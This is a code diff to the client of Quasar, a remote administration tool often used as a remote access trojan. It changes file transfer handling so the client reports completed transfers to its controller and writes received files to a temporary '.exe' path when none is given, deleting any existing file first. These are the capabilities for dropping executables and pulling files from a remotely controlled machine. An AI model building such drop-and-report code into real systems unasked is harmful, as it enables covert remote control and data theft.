@@ -8,6 +8,7 @@ using System;
 using System.IO;
 using System.Security;
 using System.Threading;
+using Quasar.Common.Helpers;
 
 namespace Quasar.Client.Commands
 {
@@ -115,6 +116,12 @@ namespace Quasar.Client.Commands
                                 Chunk = chunk
                             });
                         }
+
+                        client.Send(new FileTransferComplete
+                        {
+                            Id = command.Id,
+                            FilePath = command.RemotePath
+                        });
                     }
                 }
                 catch (Exception)
@@ -152,12 +159,21 @@ namespace Quasar.Client.Commands
             {
                 if (command.Chunk.Offset == 0)
                 {
-                    if (File.Exists(command.FilePath))
+                    string filePath = command.FilePath;
+
+                    if (string.IsNullOrEmpty(filePath))
                     {
-                        NativeMethods.DeleteFile(command.FilePath); // delete existing file
+                        // generate new temporary file path if empty
+                        filePath = FileHelper.GetTempFilePath(".exe");
                     }
 
-                    ActiveTransfers[command.Id] = new FileSplit(command.FilePath, FileAccess.Write);
+                    if (File.Exists(filePath))
+                    {
+                        // delete existing file
+                        NativeMethods.DeleteFile(filePath);
+                    }
+
+                    ActiveTransfers[command.Id] = new FileSplit(filePath, FileAccess.Write);
                 }
 
                 if (!ActiveTransfers.ContainsKey(command.Id))
@@ -168,6 +184,11 @@ namespace Quasar.Client.Commands
 
                 if (destFile.FileSize == command.FileSize)
                 {
+                    client.Send(new FileTransferComplete
+                    {
+                        Id = command.Id,
+                        FilePath = destFile.FilePath
+                    });
                     RemoveFileTransfer(command.Id);
                 }
             }
